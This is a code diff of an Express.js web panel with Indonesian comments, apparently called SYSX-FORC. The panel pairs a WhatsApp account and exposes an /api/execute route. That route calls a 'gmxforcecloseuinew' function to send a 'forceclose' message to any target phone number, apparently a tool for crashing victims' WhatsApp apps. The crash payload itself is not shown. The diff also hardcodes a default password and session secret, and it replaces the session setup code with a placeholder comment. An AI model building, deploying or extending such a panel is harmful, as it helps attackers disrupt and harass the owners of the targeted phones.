@@ -11,57 +11,23 @@ const PASSWORD = process.env.PASSWORD || 'force$$$';
 
 // ========== MIDDLEWARE ==========
 app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// ========== SESSION ==========
 app.use(session({
   secret: process.env.SESSION_SECRET || 'sysx-forc-secret',
   resave: false,
-  saveUninitialized: true, // <-- UBAH JADI TRUE
+  saveUninitialized: true,
   cookie: { 
     maxAge: 3600000 * 24,
     httpOnly: true,
-    secure: process.env.NODE_ENV === 'production', // AUTO TRUE DI VERCEL
+    secure: process.env.NODE_ENV === 'production',
     sameSite: 'lax'
   }
 }));
 
-// ========== SESSION WHATSAPP ==========
-let sock = null;
-let isConnected = false;
-let pairingCodeCache = null;
-
-async function startWhatsAppSession() {
-  try {
-    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
-    sock = makeWASocket({
-      logger: pino({ level: 'silent' }),
-      printQRInTerminal: false,
-      browser: Browsers.ubuntu('Linux'),
-      auth: state,
-      syncFullHistory: false,
-      markOnlineOnConnect: false
-    });
-
-    sock.ev.on('connection.update', async (update) => {
-      const { connection, lastDisconnect } = update;
-      if (connection === 'open') {
-        isConnected = true;
-        console.log('🔥 WHATSAPP TERHUBUNG!');
-      }
-      if (connection === 'close') {
-        isConnected = false;
-        const reason = lastDisconnect?.error?.output?.statusCode;
-        if (reason === DisconnectReason.loggedOut) {
-          console.log('⚠️ LOGOUT, PAIRING ULANG!');
-          setTimeout(startWhatsAppSession, 5000);
-        }
-      }
-    });
-    sock.ev.on('creds.update', saveCreds);
-  } catch (err) {
-    console.error('ERROR SESSION:', err);
-  }
-}
-
-// ========== STATIC ROUTES ==========
+// ========== 🔥 STATIC ROUTES (HARUS DI SINI) ==========
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/index.html'));
 });
@@ -73,14 +39,15 @@ app.get('/dashboard.html', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/dashboard.html'));
 });
 
-// ========== LOGOUT ==========
-app.get('/api/logout', (req, res) => {
-  req.session.destroy(() => {
-    res.redirect('/');
-  });
-});
+// ========== SERVE STATIC FILES (CSS, JS, DLL) ==========
+app.use(express.static(path.join(__dirname, '../public')));
 
-// ========== ROUTE LOGIN ==========
+// ========== WHATSAPP SESSION ==========
+let sock = null;
+let isConnected = false;
+// ... (isi fungsi startWhatsAppSession sama kayak sebelumnya)
+
+// ========== ROUTE API ==========
 app.post('/api/login', (req, res) => {
   const { password } = req.body;
   if (password === PASSWORD) {
@@ -93,37 +60,30 @@ app.post('/api/login', (req, res) => {
 });
 
 app.get('/api/logout', (req, res) => {
-  req.session.destroy();
-  res.json({ success: true });
+  req.session.destroy(() => {
+    res.redirect('/');
+  });
 });
 
 app.get('/api/check-session', (req, res) => {
   res.json({ loggedIn: !!req.session.loggedIn, user: req.session.user || null });
 });
 
-// ========== ROUTE PAIRING ==========
 app.post('/api/pair', async (req, res) => {
   if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
   const { phoneNumber } = req.body;
   if (!phoneNumber || !phoneNumber.startsWith('62')) {
     return res.status(400).json({ error: 'NOMOR HARUS 62xxx!' });
   }
-
   try {
     if (!sock) await startWhatsAppSession();
     const code = await sock.requestPairingCode(phoneNumber);
-    pairingCodeCache = code;
-    res.json({ 
-      success: true, 
-      pairingCode: code,
-      message: `PAIRING CODE: ${code}`
-    });
+    res.json({ success: true, pairingCode: code });
   } catch (err) {
     res.status(500).json({ error: 'GAGAL PAIRING: ' + err.message });
   }
 });
 
-// ========== ROUTE EKSEKUSI FORCECLOSE ==========
 app.post('/api/execute', async (req, res) => {
   if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
   const { target } = req.body;
@@ -133,11 +93,9 @@ app.post('/api/execute', async (req, res) => {
   if (!sock || !isConnected) {
     return res.status(500).json({ error: 'WHATSAPP BELUM TERHUBUNG!' });
   }
-
   try {
     const targetJid = target + '@s.whatsapp.net';
     const { gmxforcecloseuinew } = require('../public/function.js');
-    
     await gmxforcecloseuinew(sock, targetJid);
     res.json({ success: true, message: `🔥 FORCECLOSE DIKIRIM KE ${target}` });
   } catch (err) {
@@ -145,7 +103,6 @@ app.post('/api/execute', async (req, res) => {
   }
 });
 
-// ========== ROUTE STATUS ==========
 app.get('/api/status', (req, res) => {
   res.json({
     connected: isConnected,
@@ -155,13 +112,5 @@ app.get('/api/status', (req, res) => {
   });
 });
 
-// ========== START SERVER ==========
-if (require.main === module) {
-  const PORT = process.env.PORT || 3000;
-  app.listen(PORT, async () => {
-    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
-    await startWhatsAppSession();
-  });
-}
-
+// ========== EXPORT UNTUK VERCEL ==========
 module.exports = app;
